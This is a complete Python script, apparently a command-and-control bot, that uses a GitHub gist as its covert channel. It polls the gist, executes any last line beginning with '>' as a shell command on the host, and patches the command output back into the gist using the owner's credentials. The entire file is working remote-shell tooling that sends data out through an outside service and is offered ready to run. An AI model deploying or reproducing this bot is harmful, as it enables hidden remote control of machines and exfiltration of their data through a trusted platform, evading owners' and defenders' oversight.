import os
import sys
import getopt
import requests
import base64
import json
import subprocess
import  time

API = "https://api.github.com/gists"
GIT = ""
USER = ""
PASS = ""
FILE = "bsy-bot.py"
INTERVAL = 60

def validate_input():
    if (GIT == "" or USER == "" or PASS == ""):
        print("""arguments:
                -g (--git) - gist page
                -u (--user) - username of the owner
                -p (--password) - password of the owner
                -f (--file) - file in gist
                -i (--interval) - interval to check changes in seconds""")
        sys.exit()

def write_to_file(file_content):
    path = API + "/"+GIT;
    data = {"files": {FILE : {"content": file_content}}}
    r = requests.patch(path, headers=HEADERS, data=json.dumps(data))
    if (r.status_code != 200):
        print("error occured: ")
        print(r.json())

def executeCommand(command, content):
    try:
        call = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, shell=True)
        if (call.stdout.strip() != ""):
            output = call.stdout
        else:
            output = call.stderr
        if (output == ""):
            output = "--empty--"
    except Exception as e:
        print(e)
        output = str(e)

    content += "\n"
    content += output
    write_to_file(content)

def read_file():
    path = API + "/"+GIT;
    r = requests.get(path, headers=HEADERS)
    if (r.status_code != 200):
        print("error occured: ")
        print(r.json())
        return
    data = r.json()
    files = data["files"]
    file = files[FILE]
    try:
        content = file["content"];
        if (file["truncated"]):
            print("Cannot process truncated file, file is too big. Delete content")
            return
        lines = content.splitlines();
        line = lines[-1];
        if (line.startswith(">")):
            line = line[1:]
            print("Command detected: " + line.strip())
            executeCommand(line.strip(), content)
        else:
            print("No changes detected, waiting another "+ str(INTERVAL) + " seconds")
        
    except KeyError:
        print("error reading file with filename " + FILE)

print("Starting bot .....")

opts, args = getopt.getopt(sys.argv[1:], "g:u:p:f:i:", ["git=", "user=", "password=", "file=", "interval="]);
for opt, arg in opts:
    if (opt in ['-g', '--git']):
        GIT = arg
    elif (opt == "-u" or opt == "--user"):
        USER = arg
    elif (opt == "-p" or opt == "--password"):
        PASS = arg
    elif (opt in ['-f', '--file']):
        FILE = arg
    elif (opt in ['-i', '--interval']):
        INTERVAL = int(arg)
    else:
        print("warn: Cannot recognize option "+ opt)

validate_input()
myStr = "%s:%s" % (USER, PASS);
HEADERS ={'Accept':'application/vnd.github.v3+json', "Authorization" : "Basic " + base64.urlsafe_b64encode(myStr.encode()).decode()}
while True:
    read_file()
    print("WAITING...")
    time.sleep(INTERVAL)




